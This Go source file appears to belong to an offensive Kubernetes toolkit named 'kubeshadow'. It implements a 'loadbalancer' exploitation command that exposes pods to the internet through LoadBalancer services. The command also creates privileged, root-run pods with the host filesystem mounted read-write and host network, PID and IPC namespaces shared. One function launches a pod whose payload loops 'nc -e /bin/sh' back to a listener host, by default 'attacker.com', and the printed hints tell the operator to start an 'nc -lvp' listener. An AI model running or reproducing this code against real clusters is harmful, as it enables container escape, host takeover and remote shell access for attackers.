package exploitation

import (
	"context"
	"fmt"

	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/intstr"
	"k8s.io/client-go/kubernetes"
)

// LoadBalancerCmd represents the load balancer exploitation command
var LoadBalancerCmd = &cobra.Command{
	Use:   "loadbalancer",
	Short: "Exploit load balancer services to expose pods to the internet",
	Long: `Load Balancer Exploitation Framework

Advanced exploitation module for creating and exploiting load balancer services:
- Create load balancer services with external IPs
- Expose vulnerable pods to the internet
- Attach host filesystem access for privilege escalation
- Establish reverse shell connections over the internet
- Bypass network restrictions through load balancer exposure

Examples:
  kubeshadow exploitation loadbalancer create --target-pod vulnerable-pod --namespace default --port 80
  kubeshadow exploitation loadbalancer expose --target-pod privileged-pod --namespace kube-system --port 4444 --reverse-shell
  kubeshadow exploitation loadbalancer host-access --target-pod escape-pod --namespace default --port 8080
  kubeshadow exploitation loadbalancer list --namespace default
  kubeshadow exploitation loadbalancer cleanup --namespace default --confirm`,
	RunE: runLoadBalancerExploit,
}

func runLoadBalancerExploit(cmd *cobra.Command, args []string) error {
	action, _ := cmd.Flags().GetString("action")

	switch action {
	case "create":
		return createLoadBalancerService(cmd)
	case "expose":
		return exposePodViaLoadBalancer(cmd)
	case "host-access":
		return createHostAccessPod(cmd)
	case "reverse-shell":
		return createReverseShellPod(cmd)
	case "list":
		return listLoadBalancerServices(cmd)
	case "cleanup":
		return cleanupLoadBalancerServices(cmd)
	default:
		return listLoadBalancerServices(cmd)
	}
}

func createLoadBalancerService(cmd *cobra.Command) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	port, _ := cmd.Flags().GetInt32("port")
	serviceName, _ := cmd.Flags().GetString("service-name")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetPod == "" {
		return fmt.Errorf("target-pod is required")
	}
	if namespace == "" {
		namespace = "default"
	}
	if port == 0 {
		port = 80
	}
	if serviceName == "" {
		serviceName = fmt.Sprintf("exploit-lb-%s", targetPod)
	}

	fmt.Printf("üö® Creating load balancer service for %s/%s\n", namespace, targetPod)
	fmt.Println("=====================================================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Step 1: Verify target pod exists
	fmt.Println("üìã Step 1: Verifying target pod...")
	pod, err := clientset.CoreV1().Pods(namespace).Get(context.TODO(), targetPod, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("failed to get target pod: %v", err)
	}
	fmt.Printf("‚úÖ Found target pod: %s\n", pod.Name)

	// Step 2: Create load balancer service
	fmt.Println("üìã Step 2: Creating load balancer service...")

	service := &v1.Service{
		ObjectMeta: metav1.ObjectMeta{
			Name:      serviceName,
			Namespace: namespace,
			Labels: map[string]string{
				"kubeshadow.exploit": "loadbalancer",
				"kubeshadow.target":  targetPod,
			},
			Annotations: map[string]string{
				"kubeshadow.exploit":  "loadbalancer",
				"kubeshadow.target":   targetPod,
				"kubeshadow.port":     fmt.Sprintf("%d", port),
				"kubeshadow.external": "true",
				"kubeshadow.internet": "true",
			},
		},
		Spec: v1.ServiceSpec{
			Type: v1.ServiceTypeLoadBalancer,
			Selector: map[string]string{
				"app": pod.Labels["app"],
			},
			Ports: []v1.ServicePort{
				{
					Name:       "http",
					Port:       port,
					TargetPort: intstr.FromInt(int(port)),
					Protocol:   v1.ProtocolTCP,
				},
			},
			ExternalTrafficPolicy: v1.ServiceExternalTrafficPolicyTypeCluster,
		},
	}

	createdService, err := clientset.CoreV1().Services(namespace).Create(context.TODO(), service, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("failed to create load balancer service: %v", err)
	}

	fmt.Printf("‚úÖ Successfully created load balancer service: %s\n", createdService.Name)
	fmt.Printf("üéØ Service will be exposed to the internet with external IP\n")

	fmt.Println("\nüí° Exploitation techniques:")
	fmt.Printf("kubectl get service %s -n %s\n", serviceName, namespace)
	fmt.Printf("kubectl get service %s -n %s -o wide\n", serviceName, namespace)
	fmt.Printf("# Wait for external IP assignment, then access via external IP\n")

	return nil
}

func exposePodViaLoadBalancer(cmd *cobra.Command) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	port, _ := cmd.Flags().GetInt32("port")
	reverseShell, _ := cmd.Flags().GetBool("reverse-shell")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetPod == "" {
		return fmt.Errorf("target-pod is required")
	}
	if namespace == "" {
		namespace = "default"
	}
	if port == 0 {
		port = 80
	}

	fmt.Printf("üö® Exposing pod %s/%s to internet via load balancer\n", namespace, targetPod)
	fmt.Println("=====================================================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Step 1: Get target pod
	fmt.Println("üìã Step 1: Getting target pod...")
	pod, err := clientset.CoreV1().Pods(namespace).Get(context.TODO(), targetPod, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("failed to get target pod: %v", err)
	}

	// Step 2: Create load balancer service
	fmt.Println("üìã Step 2: Creating load balancer service...")
	serviceName := fmt.Sprintf("exploit-lb-%s", targetPod)

	service := &v1.Service{
		ObjectMeta: metav1.ObjectMeta{
			Name:      serviceName,
			Namespace: namespace,
			Labels: map[string]string{
				"kubeshadow.exploit": "loadbalancer",
				"kubeshadow.target":  targetPod,
			},
			Annotations: map[string]string{
				"kubeshadow.exploit":  "loadbalancer",
				"kubeshadow.target":   targetPod,
				"kubeshadow.port":     fmt.Sprintf("%d", port),
				"kubeshadow.external": "true",
				"kubeshadow.internet": "true",
			},
		},
		Spec: v1.ServiceSpec{
			Type:     v1.ServiceTypeLoadBalancer,
			Selector: pod.Labels,
			Ports: []v1.ServicePort{
				{
					Name:       "http",
					Port:       port,
					TargetPort: intstr.FromInt(int(port)),
					Protocol:   v1.ProtocolTCP,
				},
			},
		},
	}

	_, err = clientset.CoreV1().Services(namespace).Create(context.TODO(), service, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("failed to create load balancer service: %v", err)
	}

	fmt.Printf("‚úÖ Successfully exposed pod via load balancer service: %s\n", serviceName)

	if reverseShell {
		fmt.Println("üìã Step 3: Setting up reverse shell...")
		fmt.Println("üéØ Pod is now exposed to the internet with reverse shell capability")
	}

	fmt.Println("\nüí° Exploitation techniques:")
	fmt.Printf("kubectl get service %s -n %s -o wide\n", serviceName, namespace)
	fmt.Printf("# Access the pod via external IP on port %d\n", port)
	if reverseShell {
		fmt.Printf("# Use reverse shell: nc -lvp 4444 (on attacker machine)\n")
		fmt.Printf("# Then access: http://EXTERNAL-IP:%d\n", port)
	}

	return nil
}

func createHostAccessPod(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	port, _ := cmd.Flags().GetInt32("port")
	podName, _ := cmd.Flags().GetString("pod-name")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if namespace == "" {
		namespace = "default"
	}
	if port == 0 {
		port = 8080
	}
	if podName == "" {
		podName = "host-access-exploit"
	}

	fmt.Printf("üö® Creating host access pod with load balancer exposure\n")
	fmt.Println("=====================================================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Step 1: Create privileged pod with host access
	fmt.Println("üìã Step 1: Creating privileged pod with host access...")

	pod := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      podName,
			Namespace: namespace,
			Labels: map[string]string{
				"app":                   "host-access-exploit",
				"kubeshadow.exploit":    "host-access",
				"kubeshadow.privileged": "true",
			},
			Annotations: map[string]string{
				"kubeshadow.exploit":     "host-access",
				"kubeshadow.privileged":  "true",
				"kubeshadow.host-access": "true",
				"kubeshadow.external":    "true",
			},
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:    "host-access-container",
					Image:   "alpine:latest",
					Command: []string{"/bin/sh"},
					Args:    []string{"-c", "while true; do echo 'Host access exploit pod running'; sleep 30; done"},
					Ports: []v1.ContainerPort{
						{
							ContainerPort: port,
							Protocol:      v1.ProtocolTCP,
						},
					},
					SecurityContext: &v1.SecurityContext{
						Privileged:               &[]bool{true}[0],
						RunAsUser:                &[]int64{0}[0],
						RunAsGroup:               &[]int64{0}[0],
						AllowPrivilegeEscalation: &[]bool{true}[0],
						Capabilities: &v1.Capabilities{
							Add: []v1.Capability{"ALL"},
						},
					},
					VolumeMounts: []v1.VolumeMount{
						{
							Name:      "host-root",
							MountPath: "/host",
							ReadOnly:  false,
						},
						{
							Name:      "host-var",
							MountPath: "/host-var",
							ReadOnly:  false,
						},
						{
							Name:      "host-etc",
							MountPath: "/host-etc",
							ReadOnly:  false,
						},
					},
					Env: []v1.EnvVar{
						{
							Name:  "HOST_ACCESS",
							Value: "true",
						},
						{
							Name:  "EXPLOIT_MODE",
							Value: "host-filesystem",
						},
					},
				},
			},
			Volumes: []v1.Volume{
				{
					Name: "host-root",
					VolumeSource: v1.VolumeSource{
						HostPath: &v1.HostPathVolumeSource{
							Path: "/",
							Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
						},
					},
				},
				{
					Name: "host-var",
					VolumeSource: v1.VolumeSource{
						HostPath: &v1.HostPathVolumeSource{
							Path: "/var",
							Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
						},
					},
				},
				{
					Name: "host-etc",
					VolumeSource: v1.VolumeSource{
						HostPath: &v1.HostPathVolumeSource{
							Path: "/etc",
							Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
						},
					},
				},
			},
			HostNetwork: true,
			HostPID:     true,
			HostIPC:     true,
		},
	}

	_, err = clientset.CoreV1().Pods(namespace).Create(context.TODO(), pod, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("failed to create host access pod: %v", err)
	}

	// Step 2: Create load balancer service
	fmt.Println("üìã Step 2: Creating load balancer service...")
	serviceName := fmt.Sprintf("exploit-lb-%s", podName)

	service := &v1.Service{
		ObjectMeta: metav1.ObjectMeta{
			Name:      serviceName,
			Namespace: namespace,
			Labels: map[string]string{
				"kubeshadow.exploit": "loadbalancer",
				"kubeshadow.target":  podName,
			},
			Annotations: map[string]string{
				"kubeshadow.exploit":     "loadbalancer",
				"kubeshadow.target":      podName,
				"kubeshadow.port":        fmt.Sprintf("%d", port),
				"kubeshadow.external":    "true",
				"kubeshadow.internet":    "true",
				"kubeshadow.host-access": "true",
			},
		},
		Spec: v1.ServiceSpec{
			Type: v1.ServiceTypeLoadBalancer,
			Selector: map[string]string{
				"app": "host-access-exploit",
			},
			Ports: []v1.ServicePort{
				{
					Name:       "http",
					Port:       port,
					TargetPort: intstr.FromInt(int(port)),
					Protocol:   v1.ProtocolTCP,
				},
			},
		},
	}

	_, err = clientset.CoreV1().Services(namespace).Create(context.TODO(), service, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("failed to create load balancer service: %v", err)
	}

	fmt.Printf("‚úÖ Successfully created host access pod with load balancer: %s\n", serviceName)
	fmt.Printf("üéØ Pod has full host filesystem access and is exposed to the internet\n")

	fmt.Println("\nüí° Exploitation techniques:")
	fmt.Printf("kubectl get pod %s -n %s\n", podName, namespace)
	fmt.Printf("kubectl get service %s -n %s -o wide\n", serviceName, namespace)
	fmt.Printf("kubectl exec -it %s -n %s -- /bin/sh\n", podName, namespace)
	fmt.Printf("# Access host filesystem: ls -la /host/\n")
	fmt.Printf("# Access via external IP: http://EXTERNAL-IP:%d\n", port)

	return nil
}

func createReverseShellPod(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	port, _ := cmd.Flags().GetInt32("port")
	lhost, _ := cmd.Flags().GetString("lhost")
	lport, _ := cmd.Flags().GetInt32("lport")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if namespace == "" {
		namespace = "default"
	}
	if port == 0 {
		port = 4444
	}
	if lhost == "" {
		lhost = "attacker.com"
	}
	if lport == 0 {
		lport = 4444
	}

	fmt.Printf("üö® Creating reverse shell pod with load balancer exposure\n")
	fmt.Println("=====================================================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Step 1: Create reverse shell pod
	fmt.Println("üìã Step 1: Creating reverse shell pod...")
	podName := "reverse-shell-exploit"

	reverseShellPayload := fmt.Sprintf("while true; do nc -e /bin/sh %s %d; sleep 5; done", lhost, lport)

	pod := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      podName,
			Namespace: namespace,
			Labels: map[string]string{
				"app":                   "reverse-shell-exploit",
				"kubeshadow.exploit":    "reverse-shell",
				"kubeshadow.privileged": "true",
			},
			Annotations: map[string]string{
				"kubeshadow.exploit":       "reverse-shell",
				"kubeshadow.privileged":    "true",
				"kubeshadow.external":      "true",
				"kubeshadow.reverse-shell": "true",
				"kubeshadow.lhost":         lhost,
				"kubeshadow.lport":         fmt.Sprintf("%d", lport),
			},
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:    "reverse-shell-container",
					Image:   "alpine:latest",
					Command: []string{"/bin/sh"},
					Args:    []string{"-c", reverseShellPayload},
					Ports: []v1.ContainerPort{
						{
							ContainerPort: port,
							Protocol:      v1.ProtocolTCP,
						},
					},
					SecurityContext: &v1.SecurityContext{
						Privileged:               &[]bool{true}[0],
						RunAsUser:                &[]int64{0}[0],
						RunAsGroup:               &[]int64{0}[0],
						AllowPrivilegeEscalation: &[]bool{true}[0],
						Capabilities: &v1.Capabilities{
							Add: []v1.Capability{"ALL"},
						},
					},
					VolumeMounts: []v1.VolumeMount{
						{
							Name:      "host-root",
							MountPath: "/host",
							ReadOnly:  false,
						},
					},
					Env: []v1.EnvVar{
						{
							Name:  "REVERSE_SHELL",
							Value: "true",
						},
						{
							Name:  "LHOST",
							Value: lhost,
						},
						{
							Name:  "LPORT",
							Value: fmt.Sprintf("%d", lport),
						},
					},
				},
			},
			Volumes: []v1.Volume{
				{
					Name: "host-root",
					VolumeSource: v1.VolumeSource{
						HostPath: &v1.HostPathVolumeSource{
							Path: "/",
							Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
						},
					},
				},
			},
			HostNetwork: true,
			HostPID:     true,
			HostIPC:     true,
		},
	}

	_, err = clientset.CoreV1().Pods(namespace).Create(context.TODO(), pod, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("failed to create reverse shell pod: %v", err)
	}

	// Step 2: Create load balancer service
	fmt.Println("üìã Step 2: Creating load balancer service...")
	serviceName := fmt.Sprintf("exploit-lb-%s", podName)

	service := &v1.Service{
		ObjectMeta: metav1.ObjectMeta{
			Name:      serviceName,
			Namespace: namespace,
			Labels: map[string]string{
				"kubeshadow.exploit": "loadbalancer",
				"kubeshadow.target":  podName,
			},
			Annotations: map[string]string{
				"kubeshadow.exploit":       "loadbalancer",
				"kubeshadow.target":        podName,
				"kubeshadow.port":          fmt.Sprintf("%d", port),
				"kubeshadow.external":      "true",
				"kubeshadow.internet":      "true",
				"kubeshadow.reverse-shell": "true",
			},
		},
		Spec: v1.ServiceSpec{
			Type: v1.ServiceTypeLoadBalancer,
			Selector: map[string]string{
				"app": "reverse-shell-exploit",
			},
			Ports: []v1.ServicePort{
				{
					Name:       "reverse-shell",
					Port:       port,
					TargetPort: intstr.FromInt(int(port)),
					Protocol:   v1.ProtocolTCP,
				},
			},
		},
	}

	_, err = clientset.CoreV1().Services(namespace).Create(context.TODO(), service, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("failed to create load balancer service: %v", err)
	}

	fmt.Printf("‚úÖ Successfully created reverse shell pod with load balancer: %s\n", serviceName)
	fmt.Printf("üéØ Reverse shell will connect to %s:%d\n", lhost, lport)

	fmt.Println("\nüí° Exploitation techniques:")
	fmt.Printf("kubectl get pod %s -n %s\n", podName, namespace)
	fmt.Printf("kubectl get service %s -n %s -o wide\n", serviceName, namespace)
	fmt.Printf("# Start listener on attacker machine: nc -lvp %d\n", lport)
	fmt.Printf("# Access via external IP: http://EXTERNAL-IP:%d\n", port)

	return nil
}

func listLoadBalancerServices(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if namespace == "" {
		namespace = "default"
	}

	fmt.Printf("üîç Listing load balancer services in namespace %s\n", namespace)
	fmt.Println("=====================================================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// List services
	services, err := clientset.CoreV1().Services(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list services: %v", err)
	}

	var loadBalancerServices []v1.Service
	for _, service := range services.Items {
		if service.Spec.Type == v1.ServiceTypeLoadBalancer {
			loadBalancerServices = append(loadBalancerServices, service)
		}
	}

	if len(loadBalancerServices) == 0 {
		fmt.Println("‚ùå No load balancer services found")
		return nil
	}

	fmt.Printf("‚úÖ Found %d load balancer services:\n", len(loadBalancerServices))
	for _, service := range loadBalancerServices {
		fmt.Printf("  üì° %s/%s\n", service.Namespace, service.Name)
		if len(service.Status.LoadBalancer.Ingress) > 0 {
			for _, ingress := range service.Status.LoadBalancer.Ingress {
				if ingress.IP != "" {
					fmt.Printf("     External IP: %s\n", ingress.IP)
				}
				if ingress.Hostname != "" {
					fmt.Printf("     External Hostname: %s\n", ingress.Hostname)
				}
			}
		}
		for _, port := range service.Spec.Ports {
			fmt.Printf("     Port: %d -> %d (%s)\n", port.Port, port.TargetPort.IntVal, port.Protocol)
		}
		fmt.Println()
	}

	return nil
}

func cleanupLoadBalancerServices(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	confirm, _ := cmd.Flags().GetBool("confirm")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if namespace == "" {
		namespace = "default"
	}

	if !confirm {
		return fmt.Errorf("cleanup requires --confirm flag")
	}

	fmt.Printf("üßπ Cleaning up load balancer services in namespace %s\n", namespace)
	fmt.Println("=====================================================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// List and delete load balancer services
	services, err := clientset.CoreV1().Services(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list services: %v", err)
	}

	var deletedCount int
	for _, service := range services.Items {
		if service.Spec.Type == v1.ServiceTypeLoadBalancer &&
			(service.Labels["kubeshadow.exploit"] == "loadbalancer" ||
				service.Annotations["kubeshadow.exploit"] == "loadbalancer") {

			err := clientset.CoreV1().Services(namespace).Delete(context.TODO(), service.Name, metav1.DeleteOptions{})
			if err != nil {
				fmt.Printf("‚ö†Ô∏è  Failed to delete service %s: %v\n", service.Name, err)
			} else {
				fmt.Printf("‚úÖ Deleted service: %s\n", service.Name)
				deletedCount++
			}
		}
	}

	// Also clean up associated pods
	pods, err := clientset.CoreV1().Pods(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list pods: %v", err)
	}

	for _, pod := range pods.Items {
		if pod.Labels["kubeshadow.exploit"] == "host-access" ||
			pod.Labels["kubeshadow.exploit"] == "reverse-shell" {

			err := clientset.CoreV1().Pods(namespace).Delete(context.TODO(), pod.Name, metav1.DeleteOptions{})
			if err != nil {
				fmt.Printf("‚ö†Ô∏è  Failed to delete pod %s: %v\n", pod.Name, err)
			} else {
				fmt.Printf("‚úÖ Deleted pod: %s\n", pod.Name)
				deletedCount++
			}
		}
	}

	fmt.Printf("üéâ Cleanup complete! Deleted %d resources\n", deletedCount)
	return nil
}

func init() {
	LoadBalancerCmd.Flags().String("action", "list", "Action to perform (create, expose, host-access, reverse-shell, list, cleanup)")
	LoadBalancerCmd.Flags().String("target-pod", "", "Target pod for load balancer exposure")
	LoadBalancerCmd.Flags().String("namespace", "default", "Target namespace")
	LoadBalancerCmd.Flags().Int32("port", 80, "Port to expose")
	LoadBalancerCmd.Flags().String("service-name", "", "Name for the load balancer service")
	LoadBalancerCmd.Flags().Bool("reverse-shell", false, "Enable reverse shell capability")
	LoadBalancerCmd.Flags().String("pod-name", "", "Name for the pod")
	LoadBalancerCmd.Flags().String("lhost", "attacker.com", "Listener host for reverse shell")
	LoadBalancerCmd.Flags().Int32("lport", 4444, "Listener port for reverse shell")
	LoadBalancerCmd.Flags().Bool("confirm", false, "Confirm cleanup operation")
	LoadBalancerCmd.Flags().String("kubeconfig", "", "Path to kubeconfig file")
}
